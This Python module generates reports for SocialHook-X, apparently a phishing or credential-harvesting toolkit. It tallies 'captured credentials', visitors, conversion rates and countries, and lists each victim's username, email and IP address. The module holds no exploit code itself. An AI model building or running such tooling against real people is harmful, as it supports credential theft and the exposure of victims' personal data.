"""
SocialHook-X Report Generation Module
Generate analytics and reports
"""

import json
import logging
import html
from datetime import datetime
from pathlib import Path
from typing import Optional

logger = logging.getLogger(__name__)

class ReportGenerator:
    """Generate reports from captured data"""
    
    def __init__(self, db = None, output_dir: str = "output"):
        self.db = db
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
    
    def set_database(self, db):
        """Set database instance"""
        self.db = db
    
    def generate_summary_report(self, filename: str = "summary_report.txt") -> bool:
        """Generate summary report"""
        
        if not self.db:
            logger.error("Database not available")
            return False
        
        try:
            stats = self.db.get_statistics()
            
            report = f"""
{'='*70}
                    SocialHook-X v4.0 - Summary Report
                        Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
{'='*70}

STATISTICS
{'─'*70}
Total Credentials Captured:        {stats.get('total_credentials', 0)}
Total Visitors:                    {stats.get('total_visitors', 0)}
Conversion Rate:                   {stats.get('conversion_rate', 0):.2f}%

PER TEMPLATE STATISTICS
{'─'*70}
"""
            
            for template, count in stats.get('template_stats', {}).items():
                report += f"  {template:30s} : {count:5d} credentials\n"
            
            report += f"\nTOP COUNTRIES\n{'─'*70}\n"
            
            for country, count in list(stats.get('top_countries', {}).items())[:10]:
                report += f"  {country:30s} : {count:5d} visitors\n"
            
            report += f"\n{'='*70}\n"
            
            # Write report
            output_file = self.output_dir / filename
            with open(output_file, 'w', encoding='utf-8') as f:
                f.write(report)
            
            logger.info(f"Summary report generated: {output_file}")
            return True
        
        except Exception as e:
            logger.error(f"Error generating summary report: {e}")
            return False
    
    def generate_detailed_report(self, template: Optional[str] = None, 
                                filename: str = "detailed_report.txt") -> bool:
        """Generate detailed credentials report"""
        
        if not self.db:
            logger.error("Database not available")
            return False
        
        try:
            credentials = self.db.get_credentials(template)
            
            report = f"""
{'='*70}
                    SocialHook-X v4.0 - Detailed Report
                        Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
{'='*70}

CAPTURED CREDENTIALS ({len(credentials)} total)
{'─'*70}
"""
            
            for i, cred in enumerate(credentials, 1):
                report += f"""
Credential #{i}
  Template:    {cred.get('template', 'N/A')}
  Timestamp:   {cred.get('timestamp', 'N/A')}
  Username:    {cred.get('username', 'N/A')}
  Email:       {cred.get('email', 'N/A')}
  IP Address:  {cred.get('ip_address', 'N/A')}
  Browser:     {cred.get('browser', 'N/A')} on {cred.get('os', 'N/A')}
  User Agent:  {cred.get('user_agent', 'N/A')[:60]}...
"""
            
            report += f"\n{'='*70}\n"
            
            # Write report
            output_file = self.output_dir / filename
            with open(output_file, 'w', encoding='utf-8') as f:
                f.write(report)
            
            logger.info(f"Detailed report generated: {output_file}")
            return True
        
        except Exception as e:
            logger.error(f"Error generating detailed report: {e}")
            return False
    
    def generate_json_report(self, template: Optional[str] = None,
                            filename: str = "report_json.txt") -> bool:
        """Generate JSON report"""
        
        if not self.db:
            logger.error("Database not available")
            return False
        
        try:
            credentials = self.db.get_credentials(template)
            stats = self.db.get_statistics()
            
            report_data = {
                'generated_at': datetime.now().isoformat(),
                'statistics': stats,
                'credentials': credentials,
                'metadata': {
                    'version': '4.0',
                    'total_records': len(credentials)
                }
            }
            
            output_file = self.output_dir / filename
            with open(output_file, 'w', encoding='utf-8') as f:
                json.dump(report_data, f, indent=2, default=str)
            
            logger.info(f"JSON report generated: {output_file}")
            return True
        
        except Exception as e:
            logger.error(f"Error generating JSON report: {e}")
            return False
    
    def generate_html_report(self, template: Optional[str] = None,
                            filename: str = "report_html.txt") -> bool:
        """Generate HTML report"""
        
        if not self.db:
            logger.error("Database not available")
            return False
        
        try:
            credentials = self.db.get_credentials(template)
            stats = self.db.get_statistics()
            
            def esc(value):
                return html.escape(str(value))
            
            html_content = f"""
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>SocialHook-X Report</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }}
        .container {{ max-width: 1200px; margin: 0 auto; background: white; padding: 20px; border-radius: 8px; }}
        h1 {{ color: #333; border-bottom: 2px solid #007bff; padding-bottom: 10px; }}
        h2 {{ color: #555; margin-top: 30px; }}
        table {{ width: 100%; border-collapse: collapse; margin: 20px 0; }}
        th, td {{ border: 1px solid #ddd; padding: 12px; text-align: left; }}
        th {{ background: #007bff; color: white; }}
        tr:nth-child(even) {{ background: #f9f9f9; }}
        .stat-box {{ display: inline-block; margin: 10px; padding: 15px; background: #e7f3ff; border-radius: 5px; }}
        .stat-value {{ font-size: 24px; font-weight: bold; color: #007bff; }}
        .stat-label {{ font-size: 14px; color: #666; }}
    </style>
</head>
<body>
    <div class="container">
        <h1>SocialHook-X v4.0 - Campaign Report</h1>
        <p><strong>Generated:</strong> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
        
        <h2>Statistics</h2>
        <div class="stat-box">
            <div class="stat-label">Total Credentials</div>
            <div class="stat-value">{stats.get('total_credentials', 0)}</div>
        </div>
        <div class="stat-box">
            <div class="stat-label">Total Visitors</div>
            <div class="stat-value">{stats.get('total_visitors', 0)}</div>
        </div>
        <div class="stat-box">
            <div class="stat-label">Conversion Rate</div>
            <div class="stat-value">{stats.get('conversion_rate', 0):.2f}%</div>
        </div>
        
        <h2>Template Statistics</h2>
        <table>
            <tr>
                <th>Template</th>
                <th>Credentials</th>
            </tr>
"""
            
            for template_name, count in stats.get('template_stats', {}).items():
                html_content += (
                    f"            <tr><td>{esc(template_name)}</td><td>{esc(count)}</td></tr>\n"
                )
            
            html_content += """
        </table>
        
        <h2>Captured Credentials</h2>
        <table>
            <tr>
                <th>Template</th>
                <th>Username</th>
                <th>Email</th>
                <th>IP Address</th>
                <th>Timestamp</th>
            </tr>
"""
            
            for cred in credentials:
                html_content += f"""            <tr>
                <td>{esc(cred.get('template', 'N/A'))}</td>
                <td>{esc(cred.get('username', 'N/A'))}</td>
                <td>{esc(cred.get('email', 'N/A'))}</td>
                <td>{esc(cred.get('ip_address', 'N/A'))}</td>
                <td>{esc(cred.get('timestamp', 'N/A'))}</td>
            </tr>\n"""
            
            html_content += """
        </table>
    </div>
</body>
</html>
"""
            
            output_file = self.output_dir / filename
            with open(output_file, 'w', encoding='utf-8') as f:
                f.write(html_content)
            
            logger.info(f"HTML report generated: {output_file}")
            return True
        
        except Exception as e:
            logger.error(f"Error generating HTML report: {e}")
            return False
    
    def generate_all_reports(self) -> bool:
        """Generate all report types"""
        
        try:
            self.generate_summary_report()
            self.generate_detailed_report()
            self.generate_json_report()
            self.generate_html_report()
            
            logger.info("All reports generated successfully")
            return True
        
        except Exception as e:
            logger.error(f"Error generating all reports: {e}")
            return False
